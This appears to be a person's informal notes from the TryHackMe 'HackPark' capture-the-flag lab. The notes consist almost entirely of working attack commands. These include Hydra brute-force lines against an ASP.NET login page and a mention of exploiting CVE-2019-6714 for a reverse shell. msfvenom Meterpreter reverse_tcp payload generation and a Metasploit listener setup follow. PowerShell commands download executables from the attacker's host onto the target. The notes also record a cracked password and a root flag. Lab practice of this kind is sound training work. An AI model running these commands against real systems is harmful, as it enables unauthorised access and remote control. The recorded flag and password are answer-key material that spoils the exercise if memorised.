### HackPark ###

export IP=10.10.142.172

#  Hydra BruteForcing

/Account/login.aspx  -> POST

### Nood use of hydra(Not url encoded) ### 
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.55.208 http-post-form '/Account/login.aspx:__VIEWSTATE=K4fMQ4PNTno9O4a9mvFQlVU7+NmNu7HGiIqqPZSB8lfMzv7EJCv4kJaHy+03b6ie95TpilUpJhAIPKrmxOIjSmGIe8GpoTgfc1jwYNL9TUEBc4LuKaCOrsIPVWZ29kcJBOUxT+nPdjGmnrzkabEJxJav/sOA2fEBTisCQjHY/NKSG/Po&__EVENTVALIDATION=I5MtaoRrmqiBJ6WZBwGxbi/y4I3zAmo33ocx9Ob3XskEhbj0BXsQNCaYUWyiZ/D8qybcqSfCIHIHO2mEp9EFE8VIGoVukWXAsXk0xVg4DdpvYOs8Zc6YElLtVTtjH1LICP7sesGJ7VRwioMtgUuegV8zJBTCzczbqqnZ64LIY6tvhFxh&ctl00$MainContent$LoginUser$UserName=^USER^&ctl00$MainContent$LoginUser$Password=^PASS^&ctl00$MainContent$LoginUser$LoginButton=Log+in:Login failed'


###  Proed(But im still noob no doubt)  ###

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.142.172 http-post-form "/Account/login.aspx:__VIEWSTATE=R450UBxTpwQ1OxP8XIMQ5PaQt99ol9weoXC9O24fgI1zCC5DLPN9J852cLKMsQR05kJTApsWxaAl%2BdbE%2B8y2yYBQ%2BqRZ7pFo%2BQqRYQEqLHyjzUAoOw%2F9V%2FZ3qz468H2Rprqya180%2B%2FrXaHyfr0ldobZhJ1NlTWqf6A38nqdv1lu7EpXp&__EVENTVALIDATION=gqXx5sKshGMYUfYGWJx21QpI%2F9q7qPey67IloOgTuqbO8efPY8DDX7aEP0yW2j2YAAQphn3vZJhn8IKc50e2TO%2Fn0P37tNWSA3%2FXIgoJmLQEGuCPULYy0dfdosG9127rZeTthYyPTiedsYoexF4GxpFKzHVjEuFvPSdl%2B6Xat8RsA0A%2B&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Login+in:Login failed"





###  WriteUp Reference ###
hydra -v -l admin -P /usr/share/wordlists/rockyou.txt 10.10.55.208 http-post-form "/Account/login.aspx:__VIEWSTATE=%2BzSkE5rKklYx2evyff1oZJyuSWT7%2FP%2BrwCqOuY9eQFnN3I9b9H%2FemK0b4edjD%2BX4D0kYN6MJXUIltXwXt0PReeyBxoseUQg%2BlNpW6CHIGWNzl%2FGSvdwSZX179PJ%2FI3%2F64LNM7KzKj9sc4BMO83WdCE0KH%2FPjXAKd4RAQ7poy1tOiO7cd&__EVENTVALIDATION=8UPWUPAn6s7hJvO0Pl8kCCO3NAmIgs7nlpsgIlY%2FBUKl7fwtvPmUalPJ5PygYkVuz1H356PzRXwi%2FHQ3z8iJpgXHs8%2BloBQ4qlIePP6FdcvcR2qoLptuS0C5xNkNhrzvN5IJshWQx%2BF3kjK4PfMhuSyiPjbKZA2aFsYrqvz5b2BHveGR&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"




just wanna clear out, i didnt cheatttttt.....rockyou.txt found the pass lol :D.....pass:1qaz2wsx

found the version:3.3.6.0..looking up on exploit-db

CVE-2019-6714

used the CVE...got the rev_shell:

i am logged in as:iis apppool\blog

# This to generate the rev_shell:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.18.102 LPORT=5555 -f exe -o meter_rev_shell.exe

in msfconsole: so that msfconsole listenes on 4444:
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.11.18.102 set LPORT 5555 run


on the shell that i got earlier: 
Simple downloading the meter_rev_shell so that i can get a meterpreter shell instead:


powershell Invoke-WebRequest -Uri http://10.11.18.102:8000/meter_rev_shell.exe -Outfile shell.exe


Started the process and got the rev_shell:
Start-Process "rev_shell.exe" || shell.exe

# For Winpeas

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.18.102 LPORT=6666 -f exe -o esc.exe

powershell Invoke-WebRequest -Uri http://10.11.18.102:8000/winPEAS.exe -Outfile winPEAS.exe


laggyy///im bad:root flag:7e13d97f05f7ceb9881a3eb3d78d3e72